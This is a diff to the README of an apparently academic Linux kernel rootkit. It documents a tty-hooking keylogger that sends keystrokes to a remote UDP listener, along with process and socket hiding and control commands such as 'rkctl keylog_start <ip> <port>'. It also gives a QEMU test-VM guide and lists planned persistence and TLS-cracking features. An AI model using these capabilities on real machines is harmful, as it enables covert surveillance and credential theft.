@@ -69,7 +69,7 @@ directory.
 
 A keylogger that hooks the tty->read function to receive all the input data from TTY/PTY
 pseudoterminals, which is used for the user interface, ssh, docker, ...
-The data will then be sent to an UDP server, control characters will be parsed to a specific string format.
+The data will then be sent to a UDP server, control characters will be parsed to a specific string format.
 
 * **CSPRNG hooking:**
 
@@ -125,19 +125,17 @@ The rootkit control program supports the following commands:
     
 * ***Start Keylogger:***   
  
-    Run an arbitrary program as root (e.g. root shell via /bin/sh): 
+    Start a keylogger, given a UDP server at <ip>:<port> (e.g. via netcat: nc -lu -p 1234)
 
     ``./rkctl keylog_start <ip> <port>``
 
 * ***Stop Keylogger:***
-
-    Run an arbitrary program as root (e.g. root shell via /bin/sh): 
-
+    
     ``./rkctl keylog_stop``
     
 * ***Hide a Process:***
 
-    Hide a process and all its successors by pid (can be testes by tools like *ps* or *top*): 
+    Hide a process and all its successors by pid (can be tested by tools like *ps* or *top*): 
 
     ``./rkctl hidepid_add <pid>``
     
@@ -162,3 +160,51 @@ The rootkit control program supports the following commands:
     ``./rkctl unhide_socket_tcp <port>``
     
     ``./rkctl unhide_socket_udp <port>``
+
+## Setting up a virtualized environment for testing (Ubuntu guide)
+
+#### Download Debian Booster
+Download debian-10.6.0-amd64-netinst.iso
+
+#### Install QEMU
+`sudo apt install qemu-system-x86`
+
+#### Enable VM Hardware Support
+If not yet done, enable hardware support in your BIOS/UEFI, which allows using the -enable-kvm flag for hardware
+acceleration.
+For more details, see https://wik.ubuntuuser.de/KVM/.
+
+#### Create empty image
+`qemu-img create -f qcow2 <rk>.img 20G`
+
+#### Install debian image
+Run the following command, where <rk.img> is your empty image from the previous step and <debian.iso> is the debian booster image.
+Afterwards, follow the installation guide and enable ssh server when asked.
+
+`qemu-system-x86_64 -enable-kvm -cpu host -hda <rk.img> -cdrom <debian.iso> -boot d -m 2048`
+
+#### Create an overlay image
+Good practice might be to have an overlay image separated from a clean backup to avoid
+re-installation effort when something goes wrong during the Rootkit development:
+
+`qemu-img create -b <rk.img> -f qcow2 <rk.ovl>`
+
+#### Boot Debian with SSH server
+
+`qemu-system-x86_64 -enable-kvm -cpu host -hda <rk.ovl> -m 2048 -nic user,hostfwd=tcp::10022-:22`
+
+You can use option -s for running a GDB server at port TCP:1234 and -S for freezing
+the VM before the kernel is executed (might be helpful for debugging at an early kernel stage).
+
+#### Connect from host to VM via SSH
+
+`ssh -p 10022 localhost`
+
+Files can be transferred via scp.
+
+## Future Work
+- Port Knocking
+- Packet Hiding
+- Hiding tmp files
+- Persistence
+- Cracking local TLS connections by traffic analysis and the help of the hooked CSPRNG
